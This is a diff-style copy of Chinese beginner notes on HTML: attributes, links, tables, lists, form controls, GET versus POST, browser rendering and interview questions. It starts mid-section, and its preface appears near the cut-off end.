+<p><strong>「<strong><strong>3.</strong> <strong>标签属性</strong></strong>(<strong><strong>行内式</strong></strong>)****」</strong></p>
+<p>使用HTML制作网页时，如果想让HTML标签提供更多的信息，可以使用HTML标签的属性加以设置。</p>
+<p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2” …&gt; 内容 &lt;/标签名&gt;<br>
+&lt;手机 颜色=“红色” 大小=“5寸”&gt; &lt;/手机&gt;</p>
+<p><strong>「<strong><strong>4.</strong> **图像标签</strong><strong>img</strong></strong>」**</p>
+<p><img src="../images/clip_image002-164854855043813.jpg" alt="图片"><strong>注意：</strong></p>
+<ul>
+<li>标签可以拥有多个属性，必须写在开始标签中，位于标签名后面。</li>
+<li>属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开。</li>
+<li>采取  键值对 的格式       key=“value”  的格式</li>
+</ul>
+<img src="cz.jpg" width="300" height="300" border="3" title="这是个小蒲公英" />
+<p><strong>「<strong><strong>5.</strong> <strong>链接标签</strong></strong>(<strong><strong>重点</strong></strong>)****」</strong></p>
+<p><a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a> target=“_self”  默认窗口弹出方式 target=“_blank” 新窗口弹出</p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>href</td>
+<td>用于指定链接目标的url地址，（必须属性）当为标签应用href属性时，它就具有了超链接的功能</td>
+</tr>
+<tr>
+<td>target</td>
+<td>用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认值，_blank为在新窗口中打开方式。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>src</strong> <strong>和</strong> <strong>href</strong> <strong>的区别</strong></p>
+<p>一句话概括:<strong>src</strong> <strong>是引入资源的</strong> <strong>href</strong> <strong>是跳转<strong><strong>url</strong></strong>的</strong></p>
+<ol>
+<li>src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</li>
+<li>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素。当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。</li>
+<li>href是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接。如果我们在文档中添加那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式。</li>
+</ol>
+<p><strong>注意：</strong></p>
+<ol>
+<li>外部链接 需要添加     http:// <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></li>
+<li>内部链接 直接链接内部页面名称即可 比如 &lt; a     href=“index.html”&gt; 首页</li>
+<li>如果当时没有确定链接目标时，通常将链接标签的href属性值定义为“#”(即href=“#”)，表示该链接暂时为一个空链接。</li>
+<li>不仅可以创建文本超链接，在网页中各种网页元素，如图像、表格、音频、视频等都可以添加超链接。</li>
+</ol>
+<p><strong>锚点定位：通过创建锚点链接，用户能够快速定位到目标内容。</strong></p>
+<p>\1. 使用相应的id名标注跳转目标的位置。 (找目标)</p>
+  <h3 id="two">第2集</h3> 
+<p>\2. 使用<a href="#id名">链接文本</a>创建链接文本（被点击的）<br>
+<a href="#two"></p>
+<p>**「**<strong>6.</strong> <strong>注释标签」</strong></p>
+ <!-- 注释语句 -->   
+<p>快捷键是：  ctrl + /<br>
+或者 ctrl +shift + /</p>
+<p>**团队约定：**注释内容前后各一个空格字符，注释位于要注释代码的上面，单独占一行</p>
+<p>**「**<strong>7.</strong> <strong>路径」</strong></p>
+<p><img src="../images/clip_image004-164854855043814.png" alt="图片">**「**<strong>8.</strong> <strong>其他知识」</strong></p>
+<p><strong>预格式化文本<strong><strong>pre</strong></strong>标签</strong>元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。格式化文本就是 ，按照我们预先写好的文字格式来显示页面， 保留空格和换行等。</p>
+<p><strong>特殊字符</strong><img src="../images/clip_image006-164854855043815.jpg" alt="图片"><strong>什么是****XHTML</strong></p>
+<ul>
+<li>XHTML 指**「可扩展超文本标签语言」**（EXtensible     HyperText Markup Language）。</li>
+<li>XHTML 的目标是取代 HTML。</li>
+<li>XHTML 与 HTML 4.01 几乎是相同的。</li>
+<li>XHTML 是更严格更纯净的 HTML 版本。</li>
+<li>XHTML 是作为一种 XML 应用被重新定义的     HTML,是严格版本的HTML。例如它要求标签必须小写，标签必须被正确关闭，标签顺序必须正确排列，对于属性都必须使用双引号等。</li>
+<li>XHTML 是一个 W3C 标准。</li>
+</ul>
+<p><strong>写<strong><strong>HTML</strong></strong>代码时应注意什么？</strong></p>
+<ul>
+<li>尽可能少的使用无语义的标签div和span；</li>
+<li>在语义不明显时，既可以使用div或者p时，尽量用p, 因为p在默认情况下有上下间距，对兼容特殊终端有利；</li>
+<li>不要使用纯样式标签，如：b、font、u等，改用css设置。</li>
+<li>需要强调的文本，可以包含在strong或者em标签中（浏览器预设样式，能用CSS指定就不用他们），strong默认样式是加粗（不要用b），em是斜体（不用i）；</li>
+<li>使用表格时，标题要用<strong>caption</strong>，表头用thead，主体部分用tbody包围，尾部用tfoot包围。表头和一般单元格要区分开，表头用th，单元格用td；</li>
+<li>表单域要用<strong>fieldset</strong>标签包起来，并用<strong>legend</strong>标签说明表单的用途；</li>
+<li>每个input标签对应的说明文本都需要使用<strong>label****标签</strong>，并且通过为input设置id属性，在lable标签中设置for来让说明文本和相对应的input关联起来。</li>
+</ul>
+<p><strong>表格</strong></p>
+<p>**「**<strong>1.</strong> <strong>表格」</strong></p>
+<p>现在还是较为常用的一种标签，但不是用来布局，**常见显示、展示表格式数据。**因为它可以让数据显示的非常的规整，可读性非常好。<strong>特别是后台展示数据的时候表格运用是否熟练就显得很重要</strong>，一个清爽简约的表格能够把繁杂的数据表现得很有条理。</p>
+<p>**「**<strong>2.</strong> <strong>创建表格」</strong></p>
+<table>   <tr>     <td>单元格内的文字</td>     ...   </tr>   ... </table>
+<p><strong>table</strong>**、<strong><strong>tr</strong></strong>、<strong><strong>td</strong></strong>，**他们是创建表格的基本标签，缺一不可</p>
+<ul>
+<li>table用于定义一个表格标签。</li>
+<li>tr标签 用于定义表格中的行，必须嵌套在     table标签中。</li>
+<li>td 用于定义表格中的单元格，必须嵌套在<tr></tr>标签中。</li>
+<li>字母 td 指表格数据（table     data），即数据单元格的内容，现在我们明白，表格最合适的地方就是用来存储数据的。td像一个容器，可以容纳所有的元素。<img src="../images/clip_image008-164854855043816.jpg" alt="图片"></li>
+</ul>
+<p><strong>表头单元格标签****th</strong>:一般表头单元格位于表格的第一行或第一列，并且文本加粗居中,只需用表头标签<th></th>替代相应的单元格标签<td></td>即可。</p>
+<p><img src="../images/clip_image010-164854855043817.png" alt="图片"></p>
+<p><strong>表格标题****caption</strong>通常这个标题会被居中且显示于表格之上。caption 标签必须紧随 table 标签之后。这个标签只存在 表格里面才有意义。你是风儿我是沙</p>
+<table>    <caption>我是表格标题</caption> </table>
+<p>**「**<strong>3.</strong> <strong>表格属性」</strong></p>
+<p><img src="../images/clip_image012-164854855043818.jpg" alt="图片">三参为0，平时开发的我们这三个参数   <strong>border  cellpadding  cellspacing</strong> 为  0</p>
+<p>**「**<strong>4.</strong> <strong>合并单元格」</strong>,合并的顺序我们按照  <strong>先上</strong> <strong>后下</strong>   <strong>先左</strong>  <strong>后右</strong> 的顺序 ,合并完之后需要删除多余的单元格。</p>
+<ul>
+<li>跨行合并：rowspan=“合并单元格的个数”</li>
+<li>跨列合并：colspan=“合并单元格的个数”</li>
+</ul>
+<p>**「**<strong>5.</strong> <strong>总结表格」</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>标签名</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><table></table></td>
+<td>表格标签</td>
+<td>就是一个四方的盒子</td>
+</tr>
+<tr>
+<td><tr></tr></td>
+<td>表格行标签</td>
+<td>行标签要再table标签内部才有意义</td>
+</tr>
+<tr>
+<td><td></td></td>
+<td>单元格标签</td>
+<td>单元格标签是个容器级元素，可以放任何东西</td>
+</tr>
+<tr>
+<td><th></th></td>
+<td>表头单元格标签</td>
+<td>它还是一个单元格，但是里面的文字会居中且加粗</td>
+</tr>
+<tr>
+<td><caption></caption></td>
+<td>表格标题标签</td>
+<td>表格的标题，跟着表格一起走，和表格居中对齐</td>
+</tr>
+<tr>
+<td>clospan 和 rowspan</td>
+<td>合并属性</td>
+<td>用来合并单元格的</td>
+</tr>
+</tbody>
+</table>
+<p>**「**<strong>6.</strong> <strong>表格划分结构」</strong></p>
+<p>对于比较复杂的表格，表格的结构也就相对的复杂了，所以又将表格分割成三个部分：题头、正文和脚注。而这三部分分别用:thead,tbody,tfoot来标注， 这样更好的分清表格结构。</p>
+<p><strong>注意：</strong><br>
+1.<thead></thead>：用于定义表格的头部。用来放标题之类的东西。<thead> 内部必须拥有<tr> 标签！<br>
+\2. <tbody></tbody>：用于定义表格的主体。放数据本体 。<br>
+\3. <tfoot></tfoot>放表格的脚注之类。<br>
+\4. 以上标签都是放到table标签中。</p>
+<p><strong>列表</strong></p>
+<p>**「列表<strong><strong>ul</strong></strong>」**容器里面装载着结构，样式一致的文字或图表的一种形式，叫列表。</p>
+<p>列表最大的特点就是整齐 、整洁、 有序，跟表格类似，但是它可组合自由度会更高。</p>
+<p><strong>「<strong><strong>1.</strong> <strong>无序列表</strong> <strong>ul</strong></strong>」</strong></p>
+<ul>
+<li>
+<ul></ul>中只能嵌套<li></li>，直接在<ul></ul>标签中输入其他标签或者文字的做法是不被允许的。
+</li>
+<li>
+<li>与</li>之间相当于一个容器，可以容纳所有元素。
+</li>
+</ul>
+<ul>
+  <li>列表项1</li>
+  <li>列表项2</li>
+  <li>列表项3</li>
+  ......
+ </ul>
+<p><strong>「<strong><strong>2.</strong> <strong>有序列表</strong> <strong>ol</strong></strong>」</strong></p>
+<ul>
+<li>
+<ol>标签中的type属性值为排序的序列号，不添加type属性时，有序列表默认从数字1开始排序。
+</li>
+<li>常用的type属性值分别为是1，a，A，i，I</li>
+<li>
+<ol reversed="reversed">中的reversed属性能够让有序列表中的序列倒序排列。
+</li>
+<li>
+<ol start="3">中的start属性值为3，有序列表中的第一个序列号将从3开始排列。
+</li>
+</ul>
+<ol type="A"> 
+  <li>列表项1</li>
+  <li>列表二</li>
+  <li>列表三</li>
+ </ol>
+<p><strong>「<strong><strong>2.</strong> <strong>自定义列表</strong> <strong>dl</strong></strong>」</strong></p>
+<ul>
+<li>定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。</li>
+</ul>
+<dl>   <dt>名词1</dt>   <dd>名词1解释1</dd>   <dd>名词1解释2</dd>   ...   <dt>名词2</dt>   <dd>名词2解释1</dd>   <dd>名词2解释2</dd>   ... </dl>
+<p><img src="../images/clip_image014-164854855043819.png" alt="图片"></p>
+<p><strong>表单</strong></p>
+<p>在HTML中，一个完整的表单通常由<strong>表单控件</strong>（也称为表单元素）、<strong>提示信息</strong>和<strong>表单域</strong>3个部分构成。表单目的是为了收集用户信息。</p>
+<p><img src="../images/clip_image016-164854855043820.png" alt="图片"><strong>表单控件：</strong><br>
+包含了具体的表单功能项，如单行文本输入框、密码输入框、复选框、提交按钮、重置按钮等。<br>
+<strong>提示信息：</strong><br>
+一个表单中通常还需要包含一些说明性的文字，提示用户进行填写和操作。<br>
+<strong>表单域：</strong><br>
+它相当于一个容器，用来容纳所有的表单控件和提示信息，可以通过他定义处理表单数据所用程序的url地址，以及数据提交到服务器的方法。如果不定义表单域，表单中的数据就无法传送到后台服务器。</p>
+<p>**「**<strong>1. input</strong> <strong>控件」</strong></p>
+<input type="属性值" value="你好">
+<ul>
+<li>input 输入的意思</li>
+<li><input />标签为单标签</li>
+<li>type属性设置不同的属性值用来指定不同的控件类型</li>
+<li>除了type属性还有别的属性</li>
+</ul>
+<p><strong>常用属性：</strong></p>
+<p><img src="../images/clip_image018-164854855043821.jpg" alt="图片"></p>
+<p>用户名: <input type="text" /><br>
+密 码：<input type="password" /></p>
+<p><strong>value****属性</strong></p>
+<ul>
+<li>value 默认的文本值。有些表单想刚打开页面就默认显示几个文字，就可以通过这个value     来设置。</li>
+</ul>
+<p>用户名:<input type="text" name="username" value="请输入用户名"></p>
+<p><strong>name****属性</strong></p>
+<ul>
+<li>
+<p>name表单的名字， 这样，后台可以通过这个name属性找到这个表单。 页面中的表单很多，name主要作用就是用于区别不同的表单。</p>
+</li>
+<li>
+<ul>
+<li>name属性后面的值，是我们自己定义的。</li>
+<li>radio  如果是一组，我们必须给他们命名相同的名字 name       这样就可以多个选其中的一个啦</li>
+<li>name属性，我们现在用的较少，但是，当我们学ajax 和后台的时候，是必须的。</li>
+</ul>
+</li>
+</ul>
+<p><input type="radio" name="sex" />男<br>
+<input type="radio" name="sex" />女</p>
+<p><strong>checked****属性</strong></p>
+<ul>
+<li>表示默认选中状态。 较常见于 单选按钮和复选按钮。</li>
+</ul>
+<p>性  别:<br>
+<input type="radio" name="sex" value="男" checked="checked" />男<br>
+<input type="radio" name="sex" value="女" />女</p>
+<p><strong>input</strong> <strong>属性小结</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>表单类型</td>
+<td>用来指定不同的控件类型</td>
+</tr>
+<tr>
+<td>value</td>
+<td>表单值</td>
+<td>表单里面默认显示的文本</td>
+</tr>
+<tr>
+<td>name</td>
+<td>表单名字</td>
+<td>页面中的表单很多，name主要作用就是用于区别不同的表单。</td>
+</tr>
+<tr>
+<td>checked</td>
+<td>默认选中</td>
+<td>表示那个单选或者复选按钮一开始就被选中了</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>2.  label</strong></strong>标签」</strong></p>
+<ul>
+<li>label 标签为 input 元素定义标注（标签）。</li>
+<li>label标签主要目的是为了提高用户体验。为用户提高最优秀的服务。</li>
+</ul>
+<p>**作用：**用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点。</p>
+<p><strong>如何绑定元素呢</strong></p>
+<ul>
+<li>第一种用法就是用label标签直接包含input表单， 适合单个表单选择</li>
+<li>第二种用法 for 属性规定 label 与哪个表单元素绑定(通过id)。</li>
+</ul>
+<p>第一种<br>
+<label> 用户名：<br>
+<input type="radio" name="usename" value="请输入用户名"><br>
+</label></p>
+<p>第二种<br>
+<label for="sex">男</label><br>
+<input type="radio" name="sex" id="sex"></p>
+<p><strong>「<strong><strong>3.  textarea</strong></strong>控件</strong>**(<strong><strong>文本域</strong></strong>)****」**</p>
+<ul>
+<li>通过textarea控件可以轻松地创建多行文本输入框.</li>
+<li>cols=“每行中的字符数” rows=“显示的行数”      我们实际开发不用</li>
+</ul>
+<p><img src="../images/clip_image020-164854855043922.jpg" alt="图片"></p>
+ <textarea >
+   文本内容
+  </textarea>
+<p><strong>文本框和文本域区别</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>表单</strong></th>
+<th><strong>名称</strong></th>
+<th><strong>区别</strong></th>
+<th><strong>默认值显示</strong></th>
+<th><strong>用于场景</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>input type=“text”</td>
+<td>文本框</td>
+<td>只能显示一行文本</td>
+<td>单标签，通过value显示默认值</td>
+<td>用户名、昵称、密码等</td>
+</tr>
+<tr>
+<td>textarea</td>
+<td>文本域</td>
+<td>可以显示多行文本</td>
+<td>双标签，默认值写到标签中间</td>
+<td>留言板</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>4.  select</strong></strong>下拉列表」</strong></p>
+<ul>
+<li>如果有多个选项让用户选择，为了节约空间，我们可以使用select控件定义下拉列表。</li>
+<li>在option 中定义**selected =&quot; selected     &quot;**时，当前项即为默认选中项。</li>
+<li>我们实际开发会用的比较少</li>
+</ul>
+<p><img src="../images/clip_image021-164854855043923.png" alt="图片"></p>
+<select>
+  <option>选项1</option>
+  <option>选项2</option>
+  <option>选项3</option>
+  ...
+ </select>
+<p><strong>form****表单域</strong></p>
+<ul>
+<li>
+<p>收集的用户信息怎么传递给服务器？</p>
+</li>
+<li>
+<ul>
+<li>通过<strong>form****表单域</strong></li>
+</ul>
+</li>
+<li>
+<p>目的：</p>
+</li>
+<li>
+<ul>
+<li>在HTML中，form标签被用于定义表单域，以实现用户信息的收集和传递，form中的所有内容都会被提交给服务器。</li>
+</ul>
+</li>
+</ul>
+<form action="url地址" method="提交方式" name="表单名称">
+  各种表单控件
+ </form>
+<p><strong>常用属性：</strong></p>
+<ul>
+<li>每个表单都应该有自己表单域。后面学 <strong>ajax</strong> <strong>后台交互</strong>的时候，必须需要form表单域。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>属性值</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>url地址</td>
+<td>用于指定接收并处理表单数据的服务器程序的url地址。</td>
+</tr>
+<tr>
+<td>method</td>
+<td>get/post</td>
+<td>用于设置表单数据的提交方式，其取值为get或post。</td>
+</tr>
+<tr>
+<td>name</td>
+<td>名称</td>
+<td>用于指定表单的名称，以区分同一个页面中的多个表单。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>GET</strong> <strong>和</strong> <strong>POST</strong> <strong>的区别</strong></p>
+<ul>
+<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
+<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
+<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
+<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
+<li>GET请求大小一般是(1024字节)，http协议并没有限制，而与服务器，操作系统有关，POST理论上来说没有大小限制，http协议规范也没有进行大小限制，但实际上post所能传递的数据量根据取决于服务器的设置和内存大小。</li>
+<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
+<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
+</ul>
+<p><strong>团队约定：</strong></p>
+<ul>
+<li>元素属性值使用双引号语法</li>
+<li>元素属性值可以写上的都写上</li>
+</ul>
+<p>推荐<br>
+<input type="text" /><br>
+<input type="radio" name="name" checked="checked" /></p>
+<p><strong>从输入<strong><strong>url</strong></strong>到页面展示发生了什么</strong>**(<strong><strong>面试</strong></strong>)**</p>
+<p>作者：Twinkle_<br>
+链接：<a target="_blank" rel="noopener" href="https://juejin.im/post/6869279683230629896">https://juejin.im/post/6869279683230629896</a><br>
+来源：掘金</p>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从浏览器输入 <strong>URL</strong> 到页面渲染的整个过程都是由 浏览器架构中的各个进程之间的配合完成。</p>
+<ol>
+<li><strong>浏览器主进程</strong>: 管理子进程、提供服务功能</li>
+<li><strong>渲染进程</strong>：将HTML、CSS、JS渲染成界面，js引擎v8和排版引擎Blink就在上面，他会为每一个tab页面创建一个渲染进程</li>
+<li><strong>GPU****进程</strong>：本来是负责处理3Dcss的，后来慢慢的UI界面也交给GPU来绘制</li>
+<li><strong>网络进程</strong>：就是负责网络请求，网络资源加载的进程</li>
+<li><strong>插件进程</strong>：负责插件的运行的，因为插件很容易崩溃，把它放到独立的进程里不要让它影响别人</li>
+</ol>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从用户输入信息到页面展示的不同阶段，是不同的进程在发挥作用，示意图如下：<img src="../images/clip_image023-164854855043924.jpg" alt="图片">从图中可以看出，整个过程是需要各个进程之间相互配合完成的，过程大致可以描述为：</p>
+<ol>
+<li>用户输入url,处理输入信息，主进程开始导航，交给网络进程干活</li>
+<li>网络进程发起网络请求，其中有可能会发生重定向</li>
+<li>服务器响应URL之后，主进程就要通知渲染进程，你要开始干活了</li>
+<li>渲染进程准备好了，要想渲染进程提交数据，这个时间叫做提交文档</li>
+<li>渲染进程接受到数据，完成页面渲染。</li>
+</ol>
+<p><strong>具体过程</strong></p>
+<ol>
+<li>输入url</li>
+</ol>
+<ul>
+<li>用户输入url，处理输入信息：</li>
+<li>如果为非url结构的字符串，交给浏览器<strong>默认引擎</strong>去搜索改字符串；</li>
+<li>若为url结构的字符串，浏览器主进程会交给 <strong>网络进程</strong> ,开始干活。</li>
+</ul>
+<p>2.1 查找浏览器缓存</p>
+<ul>
+<li>网络进程会先看看是否存在本地缓存，如果有就直接返回资源给浏览器进程，无则下一步 DNS-&gt; IP -&gt; TCP</li>
+</ul>
+<p>2.2 DNS解析</p>
+<ul>
+<li>网络进程拿到url后，先会进行DNS域名解析得到<strong>IP****地址</strong>。如果请求协议是HTTPS，那么还需要建立TLS连接。</li>
+</ul>
+<p>2.2 建立TCP连接，三次握手</p>
+<ul>
+<li>接下来就是利用IP地址和服务器建立TCP连接。连接建立之后，向服务器发送请求。</li>
+</ul>
+<ol>
+<li>服务器响应</li>
+</ol>
+<ul>
+<li>服务器收到请求信息后，会根据请求信息生成响应行、响应头、响应体，并发给网络进程。网络进程接受了响应信息之后，就开始解析响应头的内容。</li>
+<li><strong>网络进程解析响应行和响应头信息的过程：</strong></li>
+</ul>
+<p>3.1 重定向</p>
+<ul>
+<li>如果响应行状态码为301（永久重定向）和302（临时），那么说明需要重定向到其他url。这时候网络进程会从响应头中的Location字段里读取重定向的地址，并重新发起网络请求。</li>
+</ul>
+<p>3.2 响应数据处理</p>
+<ul>
+<li>导航会通过请求头的<strong>Content-type</strong>字段判断响应体数据的类型。浏览器通过这个来决定如何显示响应体的内容。比如：若为application/octet-stream，则会按照下载类型来处理这个请求，导航结束。若为text/html，这就告诉浏览器服务器返回的是html格式，浏览器会通知渲染进程，你要干活了。</li>
+</ul>
+<ol>
+<li>准备渲染进程</li>
+</ol>
+<ul>
+<li>默认情况，每个页面一个渲染进程。但若处于<strong>同一站点</strong>（同根域名+协议），那么渲染进程就会复用。</li>
+</ul>
+<ol>
+<li>提交文档</li>
+</ol>
+<ul>
+<li>渲染进程准备好后，浏览器进程发出**“<strong><strong>提交文档的消息</strong></strong>”**，渲染进程接受了消息之后，会跟网络进程简历传输数据的管道。</li>
+<li>等数据传输完成了，渲染进程会告诉浏览器进程，<strong>确认文档提交</strong>，这时候浏览器会更新页面，安全状态，url，前进后退的历史。</li>
+<li>到这里导航结束，进入渲染阶段。</li>
+</ul>
+<p>注：当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为百度首页的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>
+<p><strong>前端<strong><strong>HTML</strong></strong>基础面试题</strong></p>
+<p><strong>iframe****有哪些缺点？</strong></p>
+<p>iframe是一种框架，也是一种很常见的网页嵌入方式。</p>
+<p><strong>「<strong><strong>iframe</strong></strong>的优点」</strong></p>
+<ul>
+<li>iframe能够原封不动的把嵌入的网页展现出来。</li>
+<li>如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。</li>
+<li>网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。</li>
+<li>如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。</li>
+</ul>
+<p><strong>「<strong><strong>iframe</strong></strong>的缺点」</strong></p>
+<ul>
+<li>会产生很多页面，不容易管理。</li>
+<li>iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。</li>
+<li>代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。</li>
+<li>很多的移动设备（PDA 手机）无法完全显示框架，设备兼容性差。</li>
+<li>iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。</li>
+<li>现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。</li>
+</ul>
+<p><strong>label****的作用是什么？是怎么用的？</strong></p>
+<p>例子1: 点击&quot; 用户名:&quot; 就可以定位光标到输入框</p>
+<form><label for="myid "> 用户名:</label>
+ <input type="text" id="myid" /></form> 
+<p>例子2: 点击&quot; 用户名:&quot; 或按键alt+1, 都可以定位光标到输入框</p>
+<form>
+   <label for="myid" accesskey="1"> 用户名:</label>
+   <input type="text" id="myid" tabindex="1" />
+ </form> 
+<p><strong>for</strong> <strong>属性</strong>功能：表示Label 标签要绑定的HTML 元素，你点击这个标签的时候，所绑定的元素将获取焦点。</p>
+<p><strong>acesskey</strong> <strong>属性</strong><br>
+**功能：**表示访问Label 标签所绑定的元素的热键，当您按下热键，所绑定的元素将获取焦点。<br>
+**局限性：**accessKey 属性所设置的快捷键不能与浏览器的快捷键冲突，否则将优先激活浏览器的快捷键。</p>
+<p><strong>HTML5<strong><strong>的</strong></strong>form****如何关闭自动完成功能？</strong></p>
+<p>HTML的输入框可以拥有自动完成的功能，当你往输入框输入内容的时候，浏览器会从你以前的同名输入框的历史记录中查找出类似的内容并列在输入框下面，这样就不用全部输入进去了，直接选择列表中的项目就可以了。<br>
+但有时候我们希望关闭输入框的自动完成功能，例如当用户输入内容的时候，我们希望使用AJAX技术从数据库搜索并列举而不是在用户的历史记录中搜索。</p>
+<p><strong>关闭输入框的自动完成功能有<strong><strong>3</strong></strong>种方法：</strong></p>
+<ol>
+<li>在IE的Internet选项菜单里的内容–自动完成里面设置</li>
+<li>设置form的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭自动完成功能</li>
+<li>设置输入框的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭该输入框的自动完成功能</li>
+</ol>
+<p><strong>将</strong> <strong>HTML5</strong> <strong>看作成开放的网络平台</strong></p>
+<p><strong>「什么是</strong> <strong>HTML5</strong> <strong>的基本构件（<strong><strong>building block</strong></strong>）？」</strong></p>
+<ol>
+<li>语义 - 提供更准确地描述内容。</li>
+<li>连接 - 提供新的方式与服务器通信。</li>
+<li>离线和存储 - 允许网页在本地存储数据并有效地离线运行。</li>
+<li>多媒体 - 在 Open Web 中，视频和音频被视为一等公民（first-class citizens）。</li>
+<li>2D/3D 图形和特效 - 提供更多种演示选项。</li>
+<li>性能和集成 - 提供更快的访问速度和性能更好的计算机硬件。</li>
+<li>设备访问 - 允许使用各种输入、输出设备。</li>
+<li>外观 - 可以开发丰富的主题。</li>
+</ol>
+<p><strong>浏览器是怎么对<strong><strong>HTML5</strong></strong>的离线储存资源进行管理和加载的呢？</strong></p>
+<p>在浏览器的html头部加上manifest属性，如果是第一次访问浏览器会根据manifest的内容进行下载存储离线内容，如果已经访问过则从离线存储中进行加载，然后在比对服务器如果有新内容在更新离线存储<br>
+离线的情况下，浏览器就直接使用离线存储的资源。</p>
+<p><strong>浏览器的渲染过程？</strong></p>
+<p>1、将获取的html解析成dom树<br>
+2、处理css，构成层叠样式表模型CSSOM<br>
+3、将dom树和CSSOM合并为渲染树<br>
+4、根据CSSOM将渲染树的节点布局计算<br>
+5、将渲染树节点样式绘制到页面上</p>
+<p>// 注意<br>
+在渲染的过程中是自上而下渲染，<br>
+js会阻塞页面的渲染，优先等js执行完成<br>
+如果在渲染的过程中改变了样式，会造成回流需要重新渲染</p>
+<p><strong>link<strong><strong>和</strong></strong>@import****的区别？</strong></p>
+<p>1、从属关系区别：<br>
+link属于html标签，而@import是css提供的。<br>
+2、加载顺序区别：<br>
+页面被加载时，link会同时被加载，而@import引用的css会等到页面被加载完再加载。<br>
+3、兼容性区别：<br>
+import只在IE5以上才能识别，而link是html标签，无兼容问题。<br>
+4、dom可操作性区别：<br>
+可以通过JS 操作 DOM ，插入link标签来改变样式；由于 DOM 方法是基于文档的，无法使用@import的方式插入样式<br>
+5、权重区别：<br>
+如果已经存在相同样式，@import引入的这个样式将被该 CSS 文件本身的样式层叠掉，表现出link方式的样式权重高于@import的权重这样的直观效果。<br>
+（简而言之，link和@import，谁写在后面，谁的样式就被应用，后面的样式覆盖前面的样式。）</p>
+<p><strong>src<strong><strong>与</strong></strong>href****的区别？</strong></p>
+<p>1、href 是指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，用于超链接。<br>
+2、src是指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将</p>
+<p><strong>「学习笔记」<strong><strong>HTML</strong></strong>基础</strong></p>
+<p><strong>前言</strong></p>
+<p>勤做笔记不仅可以让自己学的扎实，更重要的是可以让自己少走弯路。有人说:“再次翻开笔记是什么感觉”，我的回答是:“初恋般的感觉”。或许笔记不一定十全十美，但肯定会让你有种初恋般的怦然心动。💖💖<br>
+本章着重复习Html的基础内容，学习Html究竟要学些什么呢？主要是学习各种标签，来搭建网页的“结构”。✨✨<br>
+本篇文章主要由五个章节构成，从WEB标准到初识HTML，接着学习HTML常用标签，最后学习表格列表和表单。💪💪开始充电之旅啦~~~</p>
+<p><strong>一、认识****WEB</strong></p>
+<p><strong>「网页」<strong>主要是由</strong>文字</strong>、<strong>图像</strong>和<strong>超链接</strong>等元素构成，当然除了这些元素，网页中还可以包括音频、视频以及Flash等。</p>
+<p>**「浏览器」**是网页显示、运行的平台。</p>
+<p><strong>「浏览器内核」</strong>(排版引擎、解释引擎、渲染引擎)</p>
+<p>负责读取网页内容，整理讯息，计算网页的显示方式并显示页面。</p>
+<table>
+<thead>
+<tr>
+<th><strong>浏览器</strong></th>
